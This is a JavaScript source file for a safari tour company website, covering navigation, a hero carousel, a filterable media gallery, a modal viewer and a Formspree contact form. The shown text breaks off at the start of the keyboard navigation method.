// Modern JavaScript for Wild Africa Safaris Website
// Author: GitHub Copilot
// Enhanced with ES6+ features, performance optimizations, and accessibility

class WildAfricaSafaris {
    constructor() {
        this.init();
    }

    init() {
        // Initialize all components when DOM is loaded
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => this.initializeComponents());
        } else {
            this.initializeComponents();
        }
    }    initializeComponents() {
        this.setupLoader();
        this.setupNavigation();
        this.setupHeroCarousel();
        this.setupScrollEffects();
        this.setupGalleryFilter();
        this.setupImageModal();
        this.setupContactForm();
        this.setupAccommodationThumbnails();
        this.setupAnimations();
        this.setupKeyboardNavigation();
        this.setupLazyLoading();
        this.setupSafariTours();
        this.setupPerformanceOptimizations();
    }

    // Loading Screen
    setupLoader() {
        const loader = document.getElementById('loader');
        const minLoadTime = 1500; // Minimum loading time for UX
        const startTime = Date.now();

        window.addEventListener('load', () => {
            const loadTime = Date.now() - startTime;
            const remainingTime = Math.max(0, minLoadTime - loadTime);

            setTimeout(() => {
                loader.classList.add('hidden');
                document.body.style.overflow = 'visible';
                
                // Trigger entrance animations
                this.triggerEntranceAnimations();
            }, remainingTime);
        });
    }

    triggerEntranceAnimations() {
        const animateElements = document.querySelectorAll('.animate-text');
        animateElements.forEach((el, index) => {
            setTimeout(() => {
                el.style.opacity = '1';
                el.style.transform = 'translateY(0)';
            }, index * 200);
        });
    }

    // Navigation
    setupNavigation() {
        const navbar = document.getElementById('navbar');
        const navToggle = document.getElementById('nav-toggle');
        const navMenu = document.getElementById('nav-menu');
        const navLinks = document.querySelectorAll('.nav-link');

        // Navbar scroll effect
        let lastScrollTop = 0;
        const scrollThreshold = 100;

        window.addEventListener('scroll', this.throttle(() => {
            const scrollTop = window.pageYOffset || document.documentElement.scrollTop;
            
            // Add/remove scrolled class
            if (scrollTop > scrollThreshold) {
                navbar.classList.add('scrolled');
            } else {
                navbar.classList.remove('scrolled');
            }

            // Hide/show navbar on scroll
            if (scrollTop > lastScrollTop && scrollTop > scrollThreshold) {
                navbar.style.transform = 'translateY(-100%)';
            } else {
                navbar.style.transform = 'translateY(0)';
            }
            lastScrollTop = scrollTop;
        }, 100));

        // Mobile menu toggle
        navToggle.addEventListener('click', () => {
            navToggle.classList.toggle('active');
            navMenu.classList.toggle('active');
            document.body.style.overflow = navMenu.classList.contains('active') ? 'hidden' : '';
        });

        // Close mobile menu when clicking on links
        navLinks.forEach(link => {
            link.addEventListener('click', () => {
                navToggle.classList.remove('active');
                navMenu.classList.remove('active');
                document.body.style.overflow = '';
            });
        });

        // Smooth scroll for navigation links
        navLinks.forEach(link => {
            const href = link.getAttribute('href');
            if (href && href.startsWith('#')) {
                link.addEventListener('click', (e) => {
                    e.preventDefault();
                    const target = document.querySelector(href);
                    if (target) {
                        const offsetTop = target.offsetTop - 80; // Account for fixed navbar
                        window.scrollTo({
                            top: offsetTop,
                            behavior: 'smooth'
                        });
                    }
                });
            }
        });

        // Active nav link highlighting
        this.setupActiveNavigation(navLinks);
    }

    setupActiveNavigation(navLinks) {
        const sections = document.querySelectorAll('section[id]');
        
        window.addEventListener('scroll', this.throttle(() => {
            const scrollPos = window.scrollY + 100;
            
            sections.forEach(section => {
                const sectionTop = section.offsetTop;
                const sectionHeight = section.offsetHeight;
                const sectionId = section.getAttribute('id');
                
                if (scrollPos >= sectionTop && scrollPos < sectionTop + sectionHeight) {
                    navLinks.forEach(link => {
                        link.classList.remove('active');
                        if (link.getAttribute('href') === `#${sectionId}`) {
                            link.classList.add('active');
                        }
                    });
                }
            });
        }, 100));
    }

    // Hero Carousel
    setupHeroCarousel() {
        const slides = document.querySelectorAll('.hero-slide');
        const indicators = document.querySelectorAll('.indicator');
        const prevBtn = document.querySelector('.hero-prev');
        const nextBtn = document.querySelector('.hero-next');
        
        if (!slides.length) return;

        let currentSlide = 0;
        let isAutoPlaying = true;
        let autoPlayInterval;

        const showSlide = (index) => {
            slides.forEach((slide, i) => {
                slide.classList.toggle('active', i === index);
            });
            
            indicators.forEach((indicator, i) => {
                indicator.classList.toggle('active', i === index);
            });

            // Reset animations
            const activeSlide = slides[index];
            const animateElements = activeSlide.querySelectorAll('.animate-text');
            animateElements.forEach((el, i) => {
                el.style.opacity = '0';
                el.style.transform = 'translateY(30px)';
                setTimeout(() => {
                    el.style.opacity = '1';
                    el.style.transform = 'translateY(0)';
                }, i * 200);
            });
        };

        const nextSlide = () => {
            currentSlide = (currentSlide + 1) % slides.length;
            showSlide(currentSlide);
        };

        const prevSlide = () => {
            currentSlide = (currentSlide - 1 + slides.length) % slides.length;
            showSlide(currentSlide);
        };

        const startAutoPlay = () => {
            if (isAutoPlaying) {
                autoPlayInterval = setInterval(nextSlide, 5000);
            }
        };

        const stopAutoPlay = () => {
            clearInterval(autoPlayInterval);
        };

        // Event listeners
        nextBtn?.addEventListener('click', () => {
            nextSlide();
            stopAutoPlay();
            setTimeout(startAutoPlay, 10000); // Resume after 10 seconds
        });

        prevBtn?.addEventListener('click', () => {
            prevSlide();
            stopAutoPlay();
            setTimeout(startAutoPlay, 10000);
        });

        indicators.forEach((indicator, index) => {
            indicator.addEventListener('click', () => {
                currentSlide = index;
                showSlide(currentSlide);
                stopAutoPlay();
                setTimeout(startAutoPlay, 10000);
            });
        });

        // Pause on hover
        const heroSection = document.querySelector('.hero');
        heroSection?.addEventListener('mouseenter', stopAutoPlay);
        heroSection?.addEventListener('mouseleave', startAutoPlay);

        // Keyboard navigation
        document.addEventListener('keydown', (e) => {
            if (e.key === 'ArrowLeft') {
                prevSlide();
                stopAutoPlay();
                setTimeout(startAutoPlay, 10000);
            } else if (e.key === 'ArrowRight') {
                nextSlide();
                stopAutoPlay();
                setTimeout(startAutoPlay, 10000);
            }
        });

        // Touch/swipe support
        let touchStartX = 0;
        let touchEndX = 0;

        heroSection?.addEventListener('touchstart', (e) => {
            touchStartX = e.changedTouches[0].screenX;
        });

        heroSection?.addEventListener('touchend', (e) => {
            touchEndX = e.changedTouches[0].screenX;
            handleSwipe();
        });

        const handleSwipe = () => {
            const swipeThreshold = 50;
            if (touchEndX < touchStartX - swipeThreshold) {
                nextSlide();
            } else if (touchEndX > touchStartX + swipeThreshold) {
                prevSlide();
            }
        };

        // Start autoplay
        startAutoPlay();

        // Preload images
        this.preloadHeroImages(slides);
    }

    preloadHeroImages(slides) {
        slides.forEach(slide => {
            const bgImage = slide.style.backgroundImage;
            if (bgImage) {
                const imageUrl = bgImage.slice(4, -1).replace(/"/g, "");
                const img = new Image();
                img.src = imageUrl;
            }
        });
    }

    // Scroll Effects
    setupScrollEffects() {
        // Back to top button
        const backToTopBtn = document.getElementById('backToTop');
        
        if (backToTopBtn) {
            window.addEventListener('scroll', this.throttle(() => {
                if (window.scrollY > 300) {
                    backToTopBtn.classList.add('visible');
                } else {
                    backToTopBtn.classList.remove('visible');
                }
            }, 100));

            backToTopBtn.addEventListener('click', () => {
                window.scrollTo({
                    top: 0,
                    behavior: 'smooth'
                });
            });
        }

        // Intersection Observer for animations
        this.setupIntersectionObserver();
    }

    setupIntersectionObserver() {
        const observerOptions = {
            threshold: 0.1,
            rootMargin: '0px 0px -50px 0px'
        };

        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    entry.target.classList.add('animate-in');
                }
            });        }, observerOptions);

        // Observe elements for animation
        const animateElements = document.querySelectorAll('.safari-card, .activity-card, .feature-item, .gallery-item');
        animateElements.forEach(el => {
            observer.observe(el);
        });
    }

    // Enhanced Gallery Management
    setupGalleryFilter() {
        this.initializeGallery();
        this.setupGalleryControls();
        this.setupPagination();
        this.setupSearch();
    }    initializeGallery() {
        // Load all media from the local folder
        this.galleryData = this.loadMediaFromFolder();
        
        console.log('Gallery initialized with', this.galleryData.length, 'items');
        
        this.currentPage = 1;
        this.itemsPerPage = 24;
        this.currentFilter = 'all';
        this.currentSearch = '';
        this.currentView = 'grid';
        
        this.renderGallery();
    }

    loadMediaFromFolder() {
        // Define the media files from the local media folder
        const mediaFiles = [
            // Images
            'IMG-20231016-WA0010.jpg',
            'IMG-20250310-WA0301.jpg',
            'IMG-20250310-WA0306.jpg',
            'IMG-20250310-WA0339.jpg',
            'IMG-20250310-WA0340.jpg',
            'IMG-20250310-WA0342.jpg',
            'IMG-20250310-WA0343.jpg',
            'IMG-20250310-WA0344.jpg',
            'IMG-20250619-WA0005.jpg',
            'IMG-20250619-WA0006.jpg',
            'IMG-20250619-WA0007.jpg',
            'IMG-20250619-WA0008.jpg',
            'IMG-20250619-WA0009.jpg',
            'IMG-20250619-WA0010.jpg',
            'IMG-20250619-WA0011.jpg',
            'IMG-20250619-WA0012.jpg',
            'IMG-20250619-WA0013.jpg',
            'IMG-20250619-WA0014.jpg',
            'IMG-20250619-WA0015.jpg',
            'IMG-20250619-WA0017.jpg',
            'IMG-20250619-WA0018.jpg',
            'IMG-20250619-WA0019.jpg',
            'IMG-20250619-WA0020.jpg',
            'IMG-20250619-WA0021.jpg',
            'IMG-20250619-WA0022.jpg',
            'IMG-20250619-WA0023.jpg',
            'IMG-20250619-WA0024.jpg',
            'IMG-20250619-WA0025.jpg',
            'IMG-20250619-WA0026.jpg',
            'IMG-20250619-WA0027.jpg',
            'IMG-20250619-WA0028.jpg',
            'IMG-20250619-WA0029.jpg',
            'IMG-20250619-WA0030.jpg',
            'IMG-20250619-WA0031.jpg',
            'IMG-20250619-WA0032.jpg',
            'IMG-20250619-WA0033.jpg',
            'IMG-20250619-WA0034.jpg',
            'IMG-20250619-WA0035.jpg',
            'IMG-20250619-WA0036.jpg',
            'IMG-20250619-WA0037.jpg',
            'IMG-20250619-WA0038.jpg',
            'IMG-20250619-WA0039.jpg',
            'IMG-20250619-WA0040.jpg',
            'IMG-20250619-WA0041.jpg',
            'IMG-20250619-WA0042.jpg',
            'IMG-20250619-WA0043.jpg',
            'IMG-20250619-WA0044.jpg',
            'IMG-20250619-WA0045.jpg',
            'IMG-20250619-WA0046.jpg',
            'IMG-20250619-WA0047.jpg',
            'IMG-20250619-WA0048.jpg',
            'IMG-20250619-WA0049.jpg',
            'IMG-20250619-WA0050.jpg',
            'IMG-20250619-WA0051.jpg',
            'IMG-20250619-WA0052.jpg',
            'IMG-20250619-WA0053.jpg',
            'IMG-20250619-WA0054.jpg',
            'IMG-20250619-WA0055.jpg',
            'IMG-20250619-WA0056.jpg',
            'IMG-20250619-WA0058.jpg',
            'IMG-20250619-WA0059.jpg',
            'IMG-20250619-WA0060.jpg',
            'IMG-20250619-WA0061.jpg',
            'IMG-20250619-WA0062.jpg',
            'IMG-20250619-WA0063.jpg',
            'IMG-20250619-WA0064.jpg',
            'IMG-20250619-WA0065.jpg',
            'IMG-20250619-WA0066.jpg',
            'IMG-20250619-WA0067.jpg',
            'IMG-20250619-WA0069.jpg',
            'IMG-20250619-WA0070.jpg',
            'IMG-20250619-WA0071.jpg',
            'IMG-20250619-WA0072.jpg',
            'IMG-20250619-WA0073.jpg',
            'IMG-20250619-WA0074.jpg',
            'IMG-20250619-WA0076.jpg',
            'IMG-20250619-WA0077.jpg',
            'IMG-20250619-WA0099.jpg',
            
            // Videos
            'VID-20250619-WA0075.mp4',
            'VID-20250619-WA0078.mp4',
            'VID-20250619-WA0079.mp4',
            'VID-20250619-WA0080.mp4',
            'VID-20250619-WA0081.mp4',
            'VID-20250619-WA0082.mp4',
            'VID-20250619-WA0083.mp4',
            'VID-20250619-WA0084.mp4',
            'VID-20250619-WA0085.mp4',
            'VID-20250619-WA0086.mp4',
            'VID-20250619-WA0087.mp4',
            'VID-20250619-WA0088.mp4',
            'VID-20250619-WA0090.mp4',
            'VID-20250619-WA0091.mp4',
            'VID-20250619-WA0092.mp4',
            'VID-20250619-WA0093.mp4',
            'VID-20250619-WA0094.mp4',
            'VID-20250619-WA0095.mp4',
            'VID-20250619-WA0096.mp4',
            'VID-20250619-WA0097.mp4',
            'VID-20250619-WA0098.mp4'
        ];

        // Transform media files into gallery data with smart categorization
        return mediaFiles.map(filename => {
            const isVideo = filename.toLowerCase().endsWith('.mp4');
            const mediaType = isVideo ? 'video' : 'image';
            
            // Extract metadata from filename
            const filenameWithoutExt = filename.split('.')[0];
            const parts = filenameWithoutExt.split('-');
            const dateStr = parts[1];
            
            // Auto-categorize based on patterns or default to 'wildlife'
            let category = this.categorizeMedia(filename);
            
            // Generate title and description
            const title = this.generateTitle(filename, mediaType);
            const description = this.generateDescription(filename, mediaType, category);
            
            return {
                src: `./media/${filename}`,
                alt: title,
                title: title,
                description: description,
                category: category,
                type: mediaType,
                filename: filename,
                dateStr: dateStr
            };
        });
    }

    categorizeMedia(filename) {
        const name = filename.toLowerCase();
        
        // Categorize based on patterns in filename or content hints
        if (name.includes('landscape') || name.includes('sunset') || name.includes('scenery')) {
            return 'landscape';
        } else if (name.includes('camp') || name.includes('tent') || name.includes('fire')) {
            return 'camping';
        } else if (name.includes('activity') || name.includes('boat') || name.includes('walking')) {
            return 'activities';
        } else if (name.startsWith('vid')) {
            return 'videos'; // Special category for videos
        } else {
            return 'wildlife'; // Default to wildlife for most content
        }
    }

    generateTitle(filename, mediaType) {
        const filenameWithoutExt = filename.split('.')[0];
        const parts = filenameWithoutExt.split('-');
        
        if (mediaType === 'video') {
            return `Safari Video ${parts[parts.length - 1]}`;
        } else {
            return `Safari Moment ${parts[parts.length - 1]}`;
        }
    }

    generateDescription(filename, mediaType, category) {
        const descriptions = {
            wildlife: [
                'Amazing wildlife encounter during our safari',
                'Incredible animals in their natural habitat',
                'Majestic creatures of the African wilderness',
                'Unforgettable wildlife sighting',
                'Beautiful animals roaming free'
            ],
            landscape: [
                'Breathtaking African landscape',
                'Stunning natural scenery',
                'Beautiful wilderness views',
                'Magnificent African terrain',
                'Scenic beauty of Botswana'
            ],
            camping: [
                'Comfortable safari camping experience',
                'Mobile camping in the wilderness',
                'Authentic bush camping',
                'Safari camp setup',
                'Outdoor adventure accommodation'
            ],
            activities: [
                'Exciting safari activity',
                'Adventure experience in Africa',
                'Safari adventure moments',
                'Guided safari experience',
                'African wilderness activity'
            ],
            videos: [
                'Live action safari footage',
                'Dynamic wildlife video',
                'Safari experience in motion',
                'Real-time African adventure',
                'Immersive safari moment'
            ]
        };
        
        const categoryDescriptions = descriptions[category] || descriptions.wildlife;
        const randomIndex = Math.floor(Math.random() * categoryDescriptions.length);
        return categoryDescriptions[randomIndex];
    }

    setupGalleryControls() {
        // Filter buttons
        const filterButtons = document.querySelectorAll('.filter-btn');
        filterButtons.forEach(button => {
            button.addEventListener('click', () => {
                const filter = button.getAttribute('data-filter');
                this.currentFilter = filter;
                this.currentPage = 1;
                
                // Update active button
                filterButtons.forEach(btn => btn.classList.remove('active'));
                button.classList.add('active');
                
                this.renderGallery();
            });
        });

        // View toggle
        const viewButtons = document.querySelectorAll('.view-btn');
        viewButtons.forEach(button => {
            button.addEventListener('click', () => {
                const view = button.getAttribute('data-view');
                this.currentView = view;
                
                // Update active button
                viewButtons.forEach(btn => btn.classList.remove('active'));
                button.classList.add('active');
                
                // Update gallery view
                const galleryGrid = document.getElementById('gallery-grid');
                galleryGrid.className = `gallery-grid ${view}`;
                
                this.renderGallery();
            });
        });
    }

    setupPagination() {
        const prevBtn = document.getElementById('prev-page');
        const nextBtn = document.getElementById('next-page');
        
        if (prevBtn) {
            prevBtn.addEventListener('click', () => {
                if (this.currentPage > 1) {
                    this.currentPage--;
                    this.renderGallery();
                }
            });
        }
        
        if (nextBtn) {
            nextBtn.addEventListener('click', () => {
                const filteredData = this.getFilteredData();
                const totalPages = Math.ceil(filteredData.length / this.itemsPerPage);
                
                if (this.currentPage < totalPages) {
                    this.currentPage++;
                    this.renderGallery();
                }
            });
        }
    }

    setupSearch() {
        const searchInput = document.getElementById('gallery-search');
        if (searchInput) {
            let searchTimeout;
            searchInput.addEventListener('input', (e) => {
                clearTimeout(searchTimeout);
                searchTimeout = setTimeout(() => {
                    this.currentSearch = e.target.value.toLowerCase();
                    this.currentPage = 1;
                    this.renderGallery();
                }, 300);
            });
        }
    }    getFilteredData() {
        let filtered = this.galleryData;
        
        // Apply category filter
        if (this.currentFilter !== 'all') {
            if (this.currentFilter === 'videos') {
                filtered = filtered.filter(item => item.type === 'video');
            } else {
                filtered = filtered.filter(item => item.category === this.currentFilter);
            }
        }
        
        // Apply search filter
        if (this.currentSearch) {
            filtered = filtered.filter(item => 
                item.title.toLowerCase().includes(this.currentSearch) ||
                item.description.toLowerCase().includes(this.currentSearch) ||
                item.alt.toLowerCase().includes(this.currentSearch) ||
                item.filename.toLowerCase().includes(this.currentSearch)
            );
        }
        
        return filtered;
    }    renderGallery() {
        const galleryGrid = document.getElementById('gallery-grid');
        const filteredData = this.getFilteredData();
        const totalPages = Math.ceil(filteredData.length / this.itemsPerPage);
        
        console.log('Rendering gallery:', filteredData.length, 'items total');
        console.log('Gallery grid element:', galleryGrid);
        
        if (!galleryGrid) {
            console.error('Gallery grid element not found!');
            return;
        }
        
        // Calculate start and end indexes
        const startIndex = (this.currentPage - 1) * this.itemsPerPage;
        const endIndex = startIndex + this.itemsPerPage;
        const pageData = filteredData.slice(startIndex, endIndex);
        
        console.log('Page data:', pageData.length, 'items for page', this.currentPage);
        
        // Clear gallery
        galleryGrid.innerHTML = '';
        
        // Add loading items first
        for (let i = 0; i < this.itemsPerPage && i < pageData.length; i++) {
            const loadingItem = document.createElement('div');
            loadingItem.className = 'gallery-item loading';
            galleryGrid.appendChild(loadingItem);
        }
        
        // Render actual items with delay for smooth loading
        setTimeout(() => {
            galleryGrid.innerHTML = '';
            
            pageData.forEach((item, index) => {
                const galleryItem = this.createGalleryItem(item);
                galleryGrid.appendChild(galleryItem);
                
                // Staggered animation
                setTimeout(() => {
                    galleryItem.style.opacity = '1';
                    galleryItem.style.transform = 'translateY(0)';
                }, index * 100);
            });
            
            // Update pagination
            this.updatePagination(filteredData.length, totalPages);
            
            // Setup modal functionality for new items
            this.setupImageModal();
            
        }, 300);
    }    createGalleryItem(item) {
        const galleryItem = document.createElement('div');
        galleryItem.className = `gallery-item ${item.category} ${item.type}`;
        galleryItem.setAttribute('data-category', item.category);
        galleryItem.setAttribute('data-type', item.type);
        galleryItem.style.opacity = '0';
        galleryItem.style.transform = 'translateY(20px)';
        galleryItem.style.transition = 'all 0.3s ease';
        
        if (item.type === 'video') {
            galleryItem.innerHTML = `
                <div class="video-container">
                    <video src="${item.src}" muted playsinline preload="metadata">
                        Your browser does not support the video tag.
                    </video>
                    <div class="video-overlay">
                        <div class="play-button">
                            <i class="fas fa-play"></i>
                        </div>
                        <div class="video-duration" id="duration-${item.filename}">--:--</div>
                    </div>
                </div>
                <div class="gallery-overlay">
                    <h4>${item.title}</h4>
                    <p>${item.description}</p>
                    <button class="view-btn" data-type="video"><i class="fas fa-play-circle"></i></button>
                </div>
            `;
            
            // Add video duration detection
            const video = galleryItem.querySelector('video');
            const durationElement = galleryItem.querySelector(`#duration-${item.filename}`);
            
            video.addEventListener('loadedmetadata', () => {
                const duration = video.duration;
                const minutes = Math.floor(duration / 60);
                const seconds = Math.floor(duration % 60);
                durationElement.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
            });
            
            // Add hover play/pause functionality
            let hoverTimeout;
            galleryItem.addEventListener('mouseenter', () => {
                hoverTimeout = setTimeout(() => {
                    video.play().catch(() => {
                        // Ignore autoplay failures
                    });
                }, 500);
            });
            
            galleryItem.addEventListener('mouseleave', () => {
                clearTimeout(hoverTimeout);
                video.pause();
                video.currentTime = 0;
            });
            
        } else {
            galleryItem.innerHTML = `
                <img src="${item.src}" alt="${item.alt}" loading="lazy">
                <div class="gallery-overlay">
                    <h4>${item.title}</h4>
                    <p>${item.description}</p>
                    <button class="view-btn" data-type="image"><i class="fas fa-expand"></i></button>
                </div>
            `;
        }
        
        return galleryItem;
    }

    updatePagination(totalItems, totalPages) {
        // Update pagination info
        const currentPageSpan = document.getElementById('current-page');
        const totalPagesSpan = document.getElementById('total-pages');
        const showingCount = document.getElementById('showing-count');
        const prevBtn = document.getElementById('prev-page');
        const nextBtn = document.getElementById('next-page');
        
        if (currentPageSpan) currentPageSpan.textContent = this.currentPage;
        if (totalPagesSpan) totalPagesSpan.textContent = totalPages;
          // Update showing count
        const startItem = (this.currentPage - 1) * this.itemsPerPage + 1;
        const endItem = Math.min(this.currentPage * this.itemsPerPage, totalItems);
        if (showingCount) {
            const mediaType = this.currentFilter === 'videos' ? 'videos' : 
                             this.currentFilter === 'all' ? 'items' : 'items';
            showingCount.textContent = `Showing ${startItem}-${endItem} of ${totalItems} ${mediaType}`;
        }
        
        // Update button states
        if (prevBtn) {
            prevBtn.disabled = this.currentPage === 1;
        }
        if (nextBtn) {
            nextBtn.disabled = this.currentPage === totalPages;
        }
        
        // Update filter counts
        this.updateFilterCounts();
    }    updateFilterCounts() {
        const categories = ['all', 'wildlife', 'videos', 'landscape', 'camping', 'activities'];
        
        categories.forEach(category => {
            const countElement = document.getElementById(`count-${category}`);
            if (countElement) {
                let count;
                if (category === 'all') {
                    count = this.galleryData.length;
                } else if (category === 'videos') {
                    count = this.galleryData.filter(item => item.type === 'video').length;
                } else {
                    count = this.galleryData.filter(item => item.category === category).length;
                }
                countElement.textContent = count;
            }
        });
    }// Enhanced Image and Video Modal
    setupImageModal() {
        const modal = document.getElementById('imageModal');
        const modalContent = modal?.querySelector('.modal-content');
        const modalClose = document.querySelector('.modal-close');
        const viewButtons = document.querySelectorAll('.view-btn');

        if (!modal) return;

        viewButtons.forEach(button => {
            button.addEventListener('click', (e) => {
                e.stopPropagation();
                const galleryItem = button.closest('.gallery-item');
                const mediaType = button.getAttribute('data-type');
                const overlay = galleryItem.querySelector('.gallery-overlay');
                
                // Clear existing modal content
                const existingMedia = modalContent.querySelector('img, video');
                if (existingMedia) {
                    existingMedia.remove();
                }
                
                const title = overlay.querySelector('h4').textContent;
                const description = overlay.querySelector('p').textContent;
                
                if (mediaType === 'video') {
                    const video = galleryItem.querySelector('video');
                    const modalVideo = document.createElement('video');
                    modalVideo.id = 'modalVideo';
                    modalVideo.src = video.src;
                    modalVideo.controls = true;
                    modalVideo.autoplay = true;
                    modalVideo.style.width = '100%';
                    modalVideo.style.height = 'auto';
                    modalVideo.style.maxHeight = '70vh';
                    modalVideo.style.objectFit = 'contain';
                    
                    // Insert video before the modal caption
                    const caption = modalContent.querySelector('.modal-caption');
                    modalContent.insertBefore(modalVideo, caption);
                    
                } else {
                    const img = galleryItem.querySelector('img');
                    const modalImage = document.createElement('img');
                    modalImage.id = 'modalImage';
                    modalImage.src = img.src;
                    modalImage.alt = img.alt;
                    modalImage.style.width = '100%';
                    modalImage.style.height = 'auto';
                    modalImage.style.maxHeight = '70vh';
                    modalImage.style.objectFit = 'contain';
                    
                    // Insert image before the modal caption
                    const caption = modalContent.querySelector('.modal-caption');
                    modalContent.insertBefore(modalImage, caption);
                }
                
                // Update caption
                const modalTitle = modalContent.querySelector('#modalTitle');
                const modalDescription = modalContent.querySelector('#modalDescription');
                if (modalTitle) modalTitle.textContent = title;
                if (modalDescription) modalDescription.textContent = description;
                
                modal.classList.add('active');
                document.body.style.overflow = 'hidden';
            });
        });

        const closeModal = () => {
            modal.classList.remove('active');
            document.body.style.overflow = '';
            
            // Stop any playing video
            const modalVideo = modal.querySelector('video');
            if (modalVideo) {
                modalVideo.pause();
                modalVideo.currentTime = 0;
            }
        };

        modalClose?.addEventListener('click', closeModal);
        modal.addEventListener('click', (e) => {
            if (e.target === modal) closeModal();
        });

        // Keyboard navigation
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape' && modal.classList.contains('active')) {
                closeModal();
            }
        });
    }    // Contact Form with Formspree Integration
    setupContactForm() {
        const form = document.getElementById('inquiryForm');
        const formStatus = document.getElementById('form-status');
        const statusSuccess = formStatus.querySelector('.status-success');
        const statusError = formStatus.querySelector('.status-error');
        
        if (!form) return;

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            // Basic form validation
            const formData = new FormData(form);
            const data = Object.fromEntries(formData);
            
            if (this.validateForm(data)) {
                await this.submitFormspreeForm(form, formData);
            }
        });

        // Real-time validation
        const inputs = form.querySelectorAll('input, select, textarea');
        inputs.forEach(input => {
            input.addEventListener('blur', () => {
                this.validateField(input);
            });
        });
    }    async submitFormspreeForm(form, formData) {
        const submitBtn = form.querySelector('button[type="submit"]');
        const btnText = submitBtn.querySelector('.btn-text');
        const btnLoading = submitBtn.querySelector('.btn-loading');
        const formStatus = document.getElementById('form-status');
        const statusSuccess = formStatus.querySelector('.status-success');
        const statusError = formStatus.querySelector('.status-error');
        
        try {
            // Show loading state
            form.classList.add('submitting');
            btnText.style.display = 'none';
            btnLoading.style.display = 'flex';
            submitBtn.disabled = true;
            
            // Hide any existing status messages
            formStatus.style.display = 'none';
            statusSuccess.style.display = 'none';
            statusError.style.display = 'none';

            // Debug: Log form data
            console.log('Submitting form data:', Object.fromEntries(formData));

            // Submit to Formspree
            const response = await fetch(form.action, {
                method: 'POST',
                body: formData,
                headers: {
                    'Accept': 'application/json'
                }
            });

            console.log('Response status:', response.status);
            console.log('Response ok:', response.ok);

            if (response.ok) {
                // Success
                statusSuccess.style.display = 'flex';
                formStatus.style.display = 'block';
                
                // Reset form
                form.reset();
                
                // Scroll to success message
                formStatus.scrollIntoView({ behavior: 'smooth', block: 'center' });
                
                // Also try to redirect after 3 seconds as fallback
                setTimeout(() => {
                    if (confirm('Form submitted successfully! Would you like to go to the thank you page?')) {
                        window.location.href = 'thank-you.html';
                    }
                }, 1000);
                
            } else {
                // Get error details
                const errorData = await response.text();
                console.error('Form submission error details:', errorData);
                throw new Error(`Form submission failed: ${response.status}`);
            }
            
        } catch (error) {
            console.error('Form submission error:', error);
            
            // Show error message
            statusError.style.display = 'flex';
            formStatus.style.display = 'block';
            
            // Scroll to error message
            formStatus.scrollIntoView({ behavior: 'smooth', block: 'center' });
            
            // Fallback: Try to submit normally if AJAX fails
            setTimeout(() => {
                if (confirm('There was an issue with the form submission. Would you like to try submitting it again using a different method?')) {
                    // Remove the preventDefault and let the form submit normally
                    form.submit();
                }
            }, 2000);
            
        } finally {
            // Reset button state
            form.classList.remove('submitting');
            btnText.style.display = 'inline';
            btnLoading.style.display = 'none';
            submitBtn.disabled = false;
        }
    }

    validateForm(data) {
        let isValid = true;
        const errors = [];

        // Required fields
        if (!data.firstName) {
            errors.push('First name is required');
            isValid = false;
        }
        if (!data.lastName) {
            errors.push('Last name is required');
            isValid = false;
        }
        if (!data.email) {
            errors.push('Email is required');
            isValid = false;
        } else if (!this.isValidEmail(data.email)) {
            errors.push('Please enter a valid email address');
            isValid = false;
        }

        if (!isValid) {
            this.showFormErrors(errors);
        }

        return isValid;
    }

    validateField(field) {
        const value = field.value.trim();
        const fieldName = field.name;
        let isValid = true;

        // Remove existing error styling
        field.classList.remove('error');

        if (field.hasAttribute('required') && !value) {
            isValid = false;
        }

        if (fieldName === 'email' && value && !this.isValidEmail(value)) {
            isValid = false;
        }

        if (!isValid) {
            field.classList.add('error');
        }

        return isValid;
    }

    isValidEmail(email) {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(email);
    }    showFormErrors(errors) {
        // Create or update error display
        let errorDiv = document.querySelector('.form-errors');
        if (!errorDiv) {
            errorDiv = document.createElement('div');
            errorDiv.className = 'form-errors';
            errorDiv.style.cssText = `
                background: rgba(231, 76, 60, 0.1);
                color: #e74c3c;
                border: 1px solid rgba(231, 76, 60, 0.3);
                padding: 1rem;
                border-radius: 8px;
                margin-bottom: 1rem;
                display: flex;
                align-items: flex-start;
                gap: 10px;
            `;
            document.getElementById('inquiryForm').prepend(errorDiv);
        }

        errorDiv.innerHTML = `
            <i class="fas fa-exclamation-circle" style="margin-top: 2px; font-size: 1.1rem;"></i>
            <div>
                <strong>Please correct the following errors:</strong>
                <ul style="margin: 0.5rem 0 0 0; padding-left: 1rem;">
                    ${errors.map(error => `<li>${error}</li>`).join('')}
                </ul>
            </div>
        `;

        // Scroll to errors
        errorDiv.scrollIntoView({ behavior: 'smooth', block: 'center' });

        // Remove after 8 seconds
        setTimeout(() => {
            if (errorDiv.parentNode) {
                errorDiv.remove();
            }
        }, 8000);    }

    // Accommodation Thumbnails
    setupAccommodationThumbnails() {
        const thumbnails = document.querySelectorAll('.thumbnail');
        const featuredImage = document.querySelector('.featured-image');

        if (!featuredImage) return;

        thumbnails.forEach(thumbnail => {
            thumbnail.addEventListener('click', () => {
                // Update active thumbnail
                thumbnails.forEach(thumb => thumb.classList.remove('active'));
                thumbnail.classList.add('active');

                // Update featured image
                featuredImage.style.opacity = '0';
                setTimeout(() => {
                    featuredImage.src = thumbnail.src;
                    featuredImage.style.opacity = '1';
                }, 150);
            });
        });
    }

    // Animations
    setupAnimations() {
        // Add CSS for animations
        const style = document.createElement('style');
        style.textContent = `
            .safari-card,
            .activity-card,
            .feature-item,
            .gallery-item {
                opacity: 0;
                transform: translateY(30px);
                transition: all 0.6s ease;
            }
            
            .safari-card.animate-in,
            .activity-card.animate-in,
            .feature-item.animate-in,
            .gallery-item.animate-in {
                opacity: 1;
                transform: translateY(0);
            }
            
            .form-errors {
                animation: slideInDown 0.3s ease;
            }
            
            .form-success {
                animation: slideInDown 0.3s ease;
            }
            
            @keyframes slideInDown {
                from {
                    opacity: 0;
                    transform: translateY(-20px);
                }
                to {
                    opacity: 1;
                    transform: translateY(0);
                }
            }
            
            input.error,
            select.error,
            textarea.error {
                border-color: #ff6b6b !important;
                box-shadow: 0 0 0 2px rgba(255, 107, 107, 0.2) !important;
            }
        `;
        document.head.appendChild(style);
    }

    // Keyboard Navigation
    setupKeyboardNavigation() {
        // Tab navigation enhancements
